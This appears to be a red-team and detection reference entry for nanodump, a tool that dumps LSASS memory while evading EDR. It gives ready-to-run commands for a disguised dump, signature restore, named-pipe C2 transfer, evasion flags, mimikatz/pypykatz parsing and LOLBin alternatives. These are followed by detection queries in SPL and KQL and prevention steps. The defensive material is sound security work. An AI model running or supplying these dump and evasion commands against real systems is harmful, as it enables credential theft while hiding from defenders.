name: nanodump - Evasive LSASS Memory Dump
description: nanodump creates a minidump of LSASS using direct syscalls and an invalid/malformed minidump signature to evade EDR and signature-based detection. It avoids MiniDumpWriteDump, can restore the dump signature offline, and supports fileless transfer. Used to harvest credentials from LSASS while bypassing common dump protections.
notes:
=== BASIC DUMP (disguised extension) ===
  nanodump.x64.exe --write C:\Windows\Temp\report.docx
  # Dump signature is corrupted on disk to evade scanners

=== RESTORE SIGNATURE OFFLINE (attacker box) ===
  python3 restore_signature.py report.docx
  # Then parse with pypykatz/mimikatz

=== FILELESS / DOWNLOAD OVER C2 ===
  nanodump.x64.exe --fork --write \\127.0.0.1\pipe\x
  # BOF version runs in-process under Cobalt Strike / havoc

=== KEY EVASION OPTIONS ===
  --fork           # dump a forked clone of LSASS (less likely to be flagged)
  --snapshot       # use PssCaptureSnapshot instead of opening LSASS directly
  --duplicate      # duplicate an existing LSASS handle (no OpenProcess)
  --valid          # write a valid signature (skip corruption)

=== PARSE THE DUMP ===
  pypykatz lsa minidump report.docx
  mimikatz: sekurlsa::minidump report.docx then sekurlsa::logonpasswords

=== ALTERNATIVES ===
  procdump -ma lsass.exe  # signed LOLBin, noisier
  comsvcs.dll MiniDump    # LOLBin one-liner
  lsassy / pypykatz       # remote collection

recommended.note: ProcDump/comsvcs LOLBin dump - noisier but signed.

defense.why_it_works: Direct syscalls bypass userland API hooks EDR relies on; corrupting the minidump magic bytes defeats signature scanners; --fork/--snapshot/--duplicate avoid the heavily-monitored OpenProcess(LSASS) + MiniDumpWriteDump pattern.
defense.prerequisites: Local admin / SeDebugPrivilege on the target; nanodump binary or BOF.
defense.impact: Theft of plaintext passwords, NT hashes, and Kerberos tickets from LSASS while evading many EDRs.
defense.detection: [MITRE T1003.001] Process handle opens to lsass.exe with suspicious access masks; PssCaptureSnapshot on LSASS; process-clone (RtlCreateProcessReflection) of LSASS; use Sysmon 10 with LSASS as TargetImage; Defender ASR LSASS rule.
defense.artifacts: Minidump files with corrupted/odd headers; LSASS handle access from non-system processes; unusual syscall stubs.
defense.splunk_spl:
index=windows (EventCode=10 TargetImage="*lsass.exe") OR (EventCode=4656 ObjectName="*lsass*")
| stats count by SourceImage, GrantedAccess, Computer
defense.sentinel_kql:
DeviceEvents
| where ActionType in ("OpenProcessApiCall","CreateRemoteThreadApiCall") and FileName =~ "lsass.exe"
| project Timestamp, DeviceName, InitiatingProcessFileName, AdditionalFields
defense.prevention: Enable Credential Guard; enable the Defender ASR rule blocking LSASS credential theft; run LSASS as PPL (RunAsPPL); restrict SeDebugPrivilege; EDR with kernel-level LSASS handle monitoring.

detections.name: LSASS access via snapshot/fork (nanodump-style)
detections.logic:
DeviceEvents
| where ActionType == "OpenProcessApiCall" and FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsMpEng.exe","wininit.exe","csrss.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, AdditionalFields
detections.false_positives: AV/EDR and legitimate crash-dump tooling accessing LSASS
detections.tuning: Allowlist known security products; alert on unsigned/uncommon initiating processes
